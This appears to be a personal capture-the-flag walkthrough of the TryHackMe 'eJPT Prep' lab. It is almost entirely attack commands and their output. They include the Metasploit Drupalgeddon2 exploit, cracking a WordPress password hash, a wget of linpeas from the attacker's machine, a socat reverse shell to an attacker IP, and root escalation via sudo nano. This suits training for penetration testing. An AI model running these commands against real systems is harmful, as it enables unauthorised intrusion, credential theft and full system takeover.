+++
title = "eJPT Prep"
+++
# https://tryhackme.com/room/ejptprep

```bash
=================================
10.10.11.20 -- domain.com -- win/lin x32/x64
=================================
vpn-connect
echo 'export TARGET=10.10.11.20' >> ~/.zshrc && source ~/.zshrc

sudo nmap -n -Pn -sS -A -T4 -oA nmap_scan -p- $TARGET
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 1d:8c:f5:4a:8a:2f:30:60:ad:bf:f5:ed:cd:5f:3d:4c (RSA)
|   256 1a:4f:db:9a:fb:22:3c:2b:92:8a:73:91:a0:d6:71:77 (ECDSA)
|_  256 89:7b:ee:2a:4f:19:fd:16:68:9b:be:db:ce:62:47:d7 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-ls: Volume /
| SIZE  TIME              FILENAME
| -     2017-02-01 21:34  drupal/
| -     2020-02-06 06:33  wordpress/
|_
|_http-title: Index of /
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)

feroxbuster -t 64 -o feroxbuster_drupal_common --depth 2 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$TARGET/drupal
feroxbuster -t 64 -o feroxbuster_wordpress_common --depth 2 -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://$TARGET/wordpress

# Drupal
curl -o- http://10.10.11.20/drupal/CHANGELOG.txt
// Drupal 7.54, 2017-02-01

use exploit/unix/webapp/drupal_drupalgeddon2
set RHOSTS 10.10.11.20
set TARGETURI /drupal/
set LHOST 10.13.95.101
set LPORT 50052
run
// success

mysql -u admin
// ERROR 1045 (28000): Access denied for user 'admin'@'localhost' (using password: NO)
// good user; needs pass

download /home/auditor/alldatabackup.sql
grep -Hian 'user' alldatabackup.sql
//alldatabackup.sql:1450:INSERT INTO `wp_users` VALUES (1,'admin','$P$B4d9IZW3oGV6G940h8bXuiTnROQTtx/','admin','test@test.co
│m','http://192.168.1.129/wordpress','2024-06-16 23:12:07','',0,'admin');                                                  │

echo 'admin:$P$B4d9IZW3oGV6G940h8bXuiTnROQTtx/' > hash.txt
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
password         (admin) 

for i in python3 python python2; do command -v "$i" >/dev/null && "$i" -c 'import pty; pty.spawn("/bin/bash")' && exit; done
export TERM=xterm
mysql -u admin --password=password

show databases;
use wordpress;
select * from wp_users;
// same creds

SUID_IGNORE_LIST="chsh|gpasswd|newgrp|chfn|passwd|sudo|su|ping|ping6|mount|umount|Xorg\.wrap|ssh-keysign"
find / -perm -u=s -type f 2>/dev/null | grep -vE "/(${SUID_IGNORE_LIST})$";

cd /tmp
wget http://10.13.95.101:8000/linpeas.sh
chmod +x linpeas.sh
REGEXES="0" ./linpeas.sh 2>&1 | tee linpeas_output.txt
// Vulnerable to CVE-2021-3560
// didnt work

su auditor
// password

cat ~/.bash_history
// sudo nano
// hmmm...
# https://gtfobins.github.io/gtfobins/nano/#sudo

# socat shell upgrade since nano doesnt work with my other shell
nohup ./socat tcp-connect:10.13.95.101:60000 exec:'bash -li',pty,stderr,setsid,sigint,sane 2>&1 >/dev/null &
sudo nano
^R^X
reset; sh 1>&0 2>&0
// root!
cat /root/flag.txt
```